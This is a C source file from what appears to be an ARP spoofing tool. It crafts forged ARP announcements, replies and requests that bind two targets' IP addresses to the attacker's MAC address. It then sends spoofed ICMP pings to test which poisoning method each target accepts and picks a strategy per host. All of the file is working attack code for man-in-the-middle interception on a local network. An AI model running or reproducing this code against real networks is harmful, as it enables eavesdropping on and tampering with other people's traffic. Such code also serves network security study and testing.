#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>

#include <strat.h>
#include <protocols.h>
#include <send.h>

int apply_strategy(struct spoof_context* context, uint8_t target, uint8_t opp) {
  struct spoof_strategy* s = (target == 1 ? &(context->s1) : &(context->s2));
  uint32_t spoofed_ip = (target == 1 ? context->target_2_ip : context->target_1_ip);
  uint32_t target_ip = (target == 1 ? context->target_1_ip : context->target_2_ip);
  uint8_t* target_ether = (target == 1 ? context->target_1_ether : context->target_2_ether);

  uint8_t what = (opp == OPP_SPOOF ? s->ht_spoof : s->ht_reply);

  switch(what) {
    case SPOOF_WITH_ANNOUNCE:
      return send_arp_annoucement(spoofed_ip, context->our_ether, target_ether);
    case SPOOF_WITH_REPLY:
      return send_arp_reply(spoofed_ip, context->our_ether, target_ip, target_ether);
    case SPOOF_WITH_REQUEST:
      return send_arp_request(spoofed_ip, context->our_ether, target_ip, target_ether);
  }
  return 1;
}

uint16_t compute_checksum(char* buff, uint16_t length) {
  int i;
  uint32_t checksum = 0;
  for(i = 0;i < (length/2); i ++) {
    checksum += ((uint16_t*)buff)[i];
  }
  return ~((uint16_t)(checksum & 0xffff) + (uint16_t)(checksum >> 16));
}

int send_ping(uint8_t* our_ether, uint32_t our_ip, uint8_t* target_ether, uint32_t target_ip, uint16_t seq_number) {
  int ret;
  char* buff;
  uint16_t size = sizeof(struct ethernet_header) + sizeof(struct ip_header) + sizeof(struct icmp_header);
  if(!(buff = malloc(size))) {
    perror("malloc");
    return 1;
  }

  memset(buff, 0, size);

  // ethernet header
  struct ethernet_header* ether_p = (struct ethernet_header*)buff;
  memcpy(ether_p->ether_dhost, target_ether, 6);
  memcpy(ether_p->ether_shost, our_ether, 6);
  ether_p->ether_type = 0x8;

  // ip header
  struct ip_header* ip_p = (struct ip_header*)(buff + sizeof(struct ethernet_header));
  ip_p->version = 4;
  ip_p->IHL = sizeof(struct ip_header) / 4;
  ip_p->total_length = htons(sizeof(struct ip_header) + sizeof(struct icmp_header));
  ip_p->TTL = 2;
  ip_p->protocol = 1; // ICMP
  memcpy(ip_p->source_address, &our_ip, 4);
  memcpy(ip_p->destination_address, &target_ip, 4);
  ip_p->header_checksum = compute_checksum((char*)ip_p, sizeof(struct ip_header));

  // icmp header
  struct icmp_header* icmp_p = (struct icmp_header*)((char*)ip_p + sizeof(struct ip_header));
  icmp_p->type = 8; // echo request
  icmp_p->identifier = 0xbeef;
  icmp_p->seq_number = seq_number;
  icmp_p->checksum = compute_checksum((char*)icmp_p, sizeof(struct icmp_header));

  ret = send_frame(buff, size);

  free(buff);
  return ret;
}

int ping_listener(char* buff, struct capture_auxdata_t* aux, void* raw_args) {
  struct ping_listener_args_t* args = (struct ping_listener_args_t*) raw_args;
  struct ip_header* ip_p = (struct ip_header*)(buff + sizeof(struct ethernet_header));
  struct icmp_header* icmp_p = (struct icmp_header*)((char*)ip_p + (ip_p->IHL * 4));

  if(aux->cap_len < sizeof(struct ethernet_header) + sizeof(struct ip_header) + sizeof(struct icmp_header)) {
    fprintf(stderr, "Ping listener got truncated ICMP packet\n");
    return 0;
  }

  struct spoof_strategy* strat_ptr;

  uint16_t seq_number = icmp_p->seq_number;

  if(args->ip_1 == *((uint32_t*)ip_p->source_address)) {
    args->ip_1 = 0;
    strat_ptr = args->strat_1;
  } else if(args->ip_2 == *((uint32_t*)ip_p->source_address)) {
    args->ip_2 = 0;
    strat_ptr = args->strat_2;
  } else return 0;

  switch(seq_number) {
    case SPOOF_WITH_ANNOUNCE:
      strat_ptr->ht_spoof = SPOOF_WITH_ANNOUNCE;
      strat_ptr->ht_reply = SPOOF_WITH_ANNOUNCE;
      break;
    case SPOOF_WITH_REPLY:
      strat_ptr->ht_spoof = SPOOF_WITH_REPLY;
      strat_ptr->ht_reply = SPOOF_WITH_REPLY;
      break;
    case SPOOF_WITH_REQUEST:
      strat_ptr->ht_spoof = SPOOF_WITH_REQUEST;
      strat_ptr->ht_reply = SPOOF_WITH_REPLY;
  }

  return 0;
}

void ping_listener_thread_exit(int sig) {
  pthread_exit(NULL);
}

void* ping_listener_thread(void* raw_args) {
  struct ping_listener_args_t* args = (struct ping_listener_args_t*) raw_args;

  // set up SIGUSR1 on receive action
  if(signal(SIGUSR1, ping_listener_thread_exit) == SIG_ERR) {
    perror("signal");
  }

  if(apply_ping_filter(args->ip_1, args->ip_2)) return NULL;

  capture(ping_listener, raw_args);

  return NULL;
}

char* getStratString(uint8_t strat) {
  switch(strat) {
    case SPOOF_WITH_ANNOUNCE: return "Announcement";
    case SPOOF_WITH_REPLY: return "Reply";
    case SPOOF_WITH_REQUEST: return "Request";
    default: return "unknown strategy";
  }
}

void print_strat(struct spoof_strategy* s) {
  printf("poison\033[31m[%s]\033[0m & reply\033[31m[%s]\033[0m\n", getStratString(s->ht_spoof), getStratString(s->ht_reply));
}

int define_spoof_strategy(struct spoof_context* context) {
  int i, j, k, error_num;
  struct timespec iteration_wait = {
    .tv_sec = 0,
    .tv_nsec = WAIT_PING_ANSWER_TIME * 1000000
  }, ping_wait = {
    .tv_sec = 0,
    .tv_nsec = PING_INTERVAL * 1000000
  };
  pthread_t listener;

  struct ping_listener_args_t listener_args = {
    .ip_1 = context->target_1_ip,
    .strat_1 = &(context->s1),
    .ip_2 = context->target_2_ip,
    .strat_2 = &(context->s2),
  };

  if((error_num = pthread_create(&listener, NULL, ping_listener_thread, (void*)&listener_args))) {
    fprintf(stderr, "pthread_create: %s\n", strerror(error_num));
    return 1;
  }

  for(i = 1; i <= 3; i ++) {

    uint32_t target_ip, our_ip;
    uint8_t* target_ether;

    for(j = 0;j < 2; j ++) {
      if(j) {
        target_ip = listener_args.ip_2;
        our_ip = context->target_1_ip;
        target_ether = context->target_2_ether;
      } else {
        target_ip = listener_args.ip_1;
        our_ip = context->target_2_ip;
        target_ether = context->target_1_ether;
      }

      // if we did not receive an answer yet
      if(target_ip) {
        // try to spoof
        switch(i) {
          case SPOOF_WITH_ANNOUNCE:
            send_arp_annoucement(our_ip, context->our_ether, target_ether); break;
          case SPOOF_WITH_REPLY:
            send_arp_reply(our_ip, context->our_ether, target_ip, target_ether); break;
          case SPOOF_WITH_REQUEST:
            send_arp_request(our_ip, context->our_ether, target_ip, target_ether);
        }

        // test the spoof
        for(k = 0; k < PING_RETRY; k ++) {
            send_ping(context->our_ether, our_ip, target_ether, target_ip, (uint16_t)i);
            if(nanosleep(&ping_wait, NULL) == -1) {
              perror("nanosleep");
            }
        }
      }
    }

    // wait for answers
    if(nanosleep(&iteration_wait, NULL) == -1) {
      perror("nanosleep");
    }
  }

  // stop listening thread
  if((error_num = pthread_kill(listener, SIGUSR1))) {
    fprintf(stderr, "pthread_kill: %s\n", strerror(error_num));
    return 1;
  }

  if((error_num = pthread_join(listener, NULL))) {
    fprintf(stderr, "pthread_join: %s\n", strerror(error_num));
    return 1;
  }

  if(listener_args.ip_1) { // default strategy
    context->s1.ht_spoof = SPOOF_WITH_REPLY;
    context->s1.ht_reply = SPOOF_WITH_REPLY;
    printf("T1 strategy\033[31m[default]\033[0m: ");
  } else printf("T1 strategy: ");
  print_strat(&context->s1);

  if(listener_args.ip_2) {
    context->s2.ht_spoof = SPOOF_WITH_REPLY;
    context->s2.ht_reply = SPOOF_WITH_REPLY;
    printf("T2 strategy\033[31m[default]\033[0m: ");
  } else printf("T2 strategy: ");
  print_strat(&context->s2);

  return 0;
}
